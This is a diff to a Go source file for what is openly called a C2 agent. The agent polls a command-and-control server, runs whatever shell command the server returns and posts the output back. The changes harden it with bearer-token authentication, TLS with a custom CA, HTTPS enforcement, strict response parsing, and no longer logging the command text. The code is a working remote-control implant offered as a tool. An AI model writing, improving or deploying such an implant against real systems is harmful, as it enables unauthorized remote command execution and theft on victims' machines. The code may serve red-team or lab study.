@@ -5,12 +5,17 @@ package agent
 import (
 	"bytes"
 	"context"
+	"crypto/tls"
+	"crypto/x509"
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"log"
+	"net"
 	"net/http"
 	"net/url"
+	"os"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -19,27 +24,53 @@ import (
 	"github.com/lsanarchist/c2/pkg/protocol"
 )
 
+const clientTimeout = 10 * time.Second
+
+// Options configures security behavior for the agent client.
+type Options struct {
+	Credential    string
+	AllowHTTP     bool
+	TLSServerName string
+	CACertFile    string
+	HTTPClient    *http.Client
+}
+
 // Agent periodically checks in with the C2 server.
 type Agent struct {
-	id         string
-	hostname   string
-	serverURL  string
-	interval   time.Duration
-	httpClient *http.Client
+	id            string
+	hostname      string
+	serverURL     string
+	interval      time.Duration
+	credential    string
+	allowHTTP     bool
+	tlsServerName string
+	caCertFile    string
+	httpClient    *http.Client
 }
 
 // New creates a new Agent.
-func New(id, hostname, serverURL string, interval time.Duration) (*Agent, error) {
+func New(id, hostname, serverURL string, interval time.Duration, opts Options) (*Agent, error) {
 	a := &Agent{
-		id:         id,
-		hostname:   hostname,
-		serverURL:  serverURL,
-		interval:   interval,
-		httpClient: &http.Client{Timeout: 10 * time.Second},
+		id:            id,
+		hostname:      hostname,
+		serverURL:     serverURL,
+		interval:      interval,
+		credential:    opts.Credential,
+		allowHTTP:     opts.AllowHTTP,
+		tlsServerName: opts.TLSServerName,
+		caCertFile:    opts.CACertFile,
+		httpClient:    opts.HTTPClient,
 	}
 
 	if err := a.validateConfig(); err != nil {
 		return nil, err
+	}
+	if a.httpClient == nil {
+		httpClient, err := a.buildHTTPClient()
+		if err != nil {
+			return nil, err
+		}
+		a.httpClient = httpClient
 	}
 
 	return a, nil
@@ -52,6 +83,9 @@ func (a *Agent) validateConfig() error {
 	if a.interval <= 0 {
 		return fmt.Errorf("interval must be greater than zero: %s", a.interval)
 	}
+	if strings.TrimSpace(a.credential) == "" {
+		return errors.New("agent credential is required")
+	}
 
 	parsedURL, err := url.Parse(a.serverURL)
 	if err != nil {
@@ -63,8 +97,58 @@ func (a *Agent) validateConfig() error {
 	if parsedURL.Host == "" {
 		return fmt.Errorf("server URL host is required: %q", a.serverURL)
 	}
-
+	if parsedURL.Scheme == "http" {
+		if !a.allowHTTP {
+			return errors.New("http is disabled; use https or explicitly enable dev HTTP mode")
+		}
+		host := parsedURL.Hostname()
+		if !isLoopbackHost(host) {
+			return errors.New("dev HTTP is only allowed on loopback hosts")
+		}
+	}
 	return nil
+}
+
+func isLoopbackHost(host string) bool {
+	if host == "localhost" {
+		return true
+	}
+	if ip := net.ParseIP(host); ip != nil {
+		return ip.IsLoopback()
+	}
+	return false
+}
+
+func (a *Agent) buildHTTPClient() (*http.Client, error) {
+	parsedURL, err := url.Parse(a.serverURL)
+	if err != nil {
+		return nil, fmt.Errorf("invalid server URL: %w", err)
+	}
+	if parsedURL.Scheme != "https" {
+		return &http.Client{Timeout: clientTimeout}, nil
+	}
+
+	tlsConfig := &tls.Config{
+		MinVersion: tls.VersionTLS12,
+	}
+	if a.tlsServerName != "" {
+		tlsConfig.ServerName = a.tlsServerName
+	}
+
+	if strings.TrimSpace(a.caCertFile) != "" {
+		caPEM, err := os.ReadFile(a.caCertFile)
+		if err != nil {
+			return nil, fmt.Errorf("read ca certificate: %w", err)
+		}
+		roots := x509.NewCertPool()
+		if !roots.AppendCertsFromPEM(caPEM) {
+			return nil, errors.New("invalid CA certificate PEM")
+		}
+		tlsConfig.RootCAs = roots
+	}
+
+	transport := &http.Transport{TLSClientConfig: tlsConfig}
+	return &http.Client{Timeout: clientTimeout, Transport: transport}, nil
 }
 
 // RunOnce performs a single check-in cycle. It is primarily useful for testing.
@@ -72,9 +156,7 @@ func (a *Agent) RunOnce(ctx context.Context) error {
 	if err := a.validateConfig(); err != nil {
 		return err
 	}
-
-	a.checkIn(ctx)
-	return nil
+	return a.checkIn(ctx)
 }
 
 // Run starts the agent check-in loop and exits when ctx is canceled.
@@ -88,7 +170,7 @@ func (a *Agent) Run(ctx context.Context) error {
 	defer ticker.Stop()
 
 	if err := a.RunOnce(ctx); err != nil {
-		return err
+		log.Printf("[agent] initial check-in failed: %v", err)
 	}
 
 	for {
@@ -97,13 +179,15 @@ func (a *Agent) Run(ctx context.Context) error {
 			log.Printf("[agent] stopping: %v", ctx.Err())
 			return nil
 		case <-ticker.C:
-			a.checkIn(ctx)
+			if err := a.checkIn(ctx); err != nil {
+				log.Printf("[agent] check-in failed: %v", err)
+			}
 		}
 	}
 }
 
 // checkIn sends a check-in request to the server and handles any returned command.
-func (a *Agent) checkIn(ctx context.Context) {
+func (a *Agent) checkIn(ctx context.Context) error {
 	ci := protocol.CheckIn{
 		ID:       a.id,
 		Hostname: a.hostname,
@@ -113,35 +197,36 @@ func (a *Agent) checkIn(ctx context.Context) {
 
 	body, err := json.Marshal(ci)
 	if err != nil {
-		log.Printf("[agent] marshal error: %v", err)
-		return
+		return fmt.Errorf("marshal check-in: %w", err)
 	}
 
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.serverURL+"/checkin", bytes.NewReader(body))
 	if err != nil {
-		log.Printf("[agent] build check-in request failed: %v", err)
-		return
+		return fmt.Errorf("build check-in request: %w", err)
 	}
 	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+a.credential)
 
 	resp, err := a.httpClient.Do(req)
 	if err != nil {
-		log.Printf("[agent] check-in failed: %v", err)
-		return
+		return fmt.Errorf("check-in failed: %w", err)
 	}
 	defer resp.Body.Close()
 
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("check-in unexpected response: %d", resp.StatusCode)
+	}
+
 	var ciResp protocol.CheckInResponse
-	if err := json.NewDecoder(resp.Body).Decode(&ciResp); err != nil {
-		log.Printf("[agent] decode response error: %v", err)
-		return
+	if err := decodeStrictJSONResponse(resp.Body, &ciResp); err != nil {
+		return fmt.Errorf("decode check-in response: %w", err)
 	}
 
 	if ciResp.Command == "" {
-		return
+		return nil
 	}
 
-	log.Printf("[agent] executing command %s: %s", ciResp.CommandID, ciResp.Command)
+	log.Printf("[agent] executing command %s", ciResp.CommandID)
 	output, execErr := a.execute(ciResp.Command)
 
 	result := protocol.Result{
@@ -153,7 +238,22 @@ func (a *Agent) checkIn(ctx context.Context) {
 		result.Error = execErr.Error()
 	}
 
-	a.sendResult(ctx, result)
+	if err := a.sendResult(ctx, result); err != nil {
+		return err
+	}
+	return nil
+}
+
+func decodeStrictJSONResponse(body io.Reader, dst any) error {
+	dec := json.NewDecoder(body)
+	dec.DisallowUnknownFields()
+	if err := dec.Decode(dst); err != nil {
+		return err
+	}
+	if err := dec.Decode(&struct{}{}); err != io.EOF {
+		return errors.New("multiple JSON values")
+	}
+	return nil
 }
 
 // execute runs the given shell command and returns its combined output.
@@ -169,28 +269,27 @@ func (a *Agent) execute(command string) (string, error) {
 }
 
 // sendResult posts a command result back to the server.
-func (a *Agent) sendResult(ctx context.Context, result protocol.Result) {
+func (a *Agent) sendResult(ctx context.Context, result protocol.Result) error {
 	body, err := json.Marshal(result)
 	if err != nil {
-		log.Printf("[agent] marshal result error: %v", err)
-		return
+		return fmt.Errorf("marshal result: %w", err)
 	}
 
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.serverURL+"/result", bytes.NewReader(body))
 	if err != nil {
-		log.Printf("[agent] build result request failed: %v", err)
-		return
+		return fmt.Errorf("build result request: %w", err)
 	}
 	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+a.credential)
 
 	resp, err := a.httpClient.Do(req)
 	if err != nil {
-		log.Printf("[agent] send result failed: %v", err)
-		return
+		return fmt.Errorf("send result: %w", err)
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusNoContent {
-		log.Printf("[agent] unexpected result response: %d", resp.StatusCode)
+		return fmt.Errorf("unexpected result response: %d", resp.StatusCode)
 	}
+	return nil
 }
